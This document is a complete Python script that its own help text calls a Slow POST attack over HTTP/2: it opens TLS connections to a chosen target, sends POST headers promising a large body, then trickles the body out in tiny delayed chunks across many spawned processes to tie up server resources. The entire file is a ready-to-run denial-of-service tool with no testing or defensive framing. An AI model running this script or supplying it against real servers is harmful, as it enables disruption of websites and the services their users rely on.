#!/usr/bin/python3

import socket
import ssl
import h2.connection
import h2.events
import argparse
import time
from multiprocessing import Process

def establish_tls_connection():
    try:
        context = ssl.create_default_context()
        context.set_alpn_protocols(['h2'])
        sock = socket.create_connection((args.target, args.port))
        tls_sock = context.wrap_socket(sock, server_hostname=args.target)
        return tls_sock
    except Exception as e:
        print(f"Error establishing TLS connection: {e}")
        exit(1)

def send_slow_post(tls_sock):
    try:
        conn = h2.connection.H2Connection()
        conn.initiate_connection()
        tls_sock.sendall(conn.data_to_send())

        headers = [
            (':method', 'POST'),
            (':authority', args.target),
            (':scheme', 'https'),
            (':path', args.path),
            ('content-length', '10000'),
            ('content-type', 'application/x-www-form-urlencoded')
        ]

        stream_id = conn.get_next_available_stream_id()
        conn.send_headers(stream_id, headers, end_stream=False)
        tls_sock.sendall(conn.data_to_send())

        print(f"POST headers sent. Server is waiting for data...")

        body = b"a" * 10000
        sent_bytes = 0

        while sent_bytes < len(body):
            if args.delay_before_first_data_frame:
                time.sleep(args.chunk_delay)
            chunk = body[sent_bytes:sent_bytes + args.chunk_size]
            conn.send_data(stream_id, chunk, end_stream=False)
            tls_sock.sendall(conn.data_to_send())
            sent_bytes += len(chunk)

            print(f"Sent {sent_bytes}/{len(body)} bytes...")
            if not args.delay_before_first_data_frame:
                time.sleep(args.chunk_delay)
        conn.end_stream(stream_id)
        tls_sock.sendall(conn.data_to_send())

        while True:
            data = tls_sock.recv(65535)
            if data:
                events = conn.receive_data(data)
                for event in events:
                    if isinstance(event, h2.events.StreamEnded):
                        print(f"Stream {event.stream_id} ended.")
                        return
                    elif isinstance(event, h2.events.ResponseReceived):
                        print(f"Server response received: {event.headers}")
                tls_sock.sendall(conn.data_to_send())
    except Exception as e:
        print(f"Error during the attack: {e}")
    finally:
        tls_sock.close()

def main():
    tls_sock = establish_tls_connection()
    send_slow_post(tls_sock)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Perform a Slow POST attack over HTTP/2.")
    parser.add_argument('-t', '--target', type=str, required=True, help="Target hostname or IP address.")
    parser.add_argument('-p', '--port', type=int, default=443, help="Target port (default: 443).")
    parser.add_argument('--path', type=str, default="/", help="Target path (default: '/').")
    parser.add_argument('-P', '--process', type=int, default=1, help="Number of processes to spawn (default: 1).")
    parser.add_argument('-d', '--delay', type=float, default=0.1, help="Delay between spawning processes in seconds (default: 0.1).")
    parser.add_argument('--chunk-size', type=int, default=10, help="Size of each data chunk sent (default: 10 bytes).")
    parser.add_argument('--chunk-delay', type=float, default=1, help="Delay between sending data chunks in seconds (default: 1s).")
    parser.add_argument('--delay-before-first-data-frame', action='store_true', help="Set whether the delay will be before the first DATA frame")

    args = parser.parse_args()

    process_list = []

    for i in range(args.process):
        process = Process(target=main, daemon=True)
        process_list.append(process)
        process.start()

        time.sleep(args.delay)

    for process in process_list:
        if process.is_alive():
            process.join()
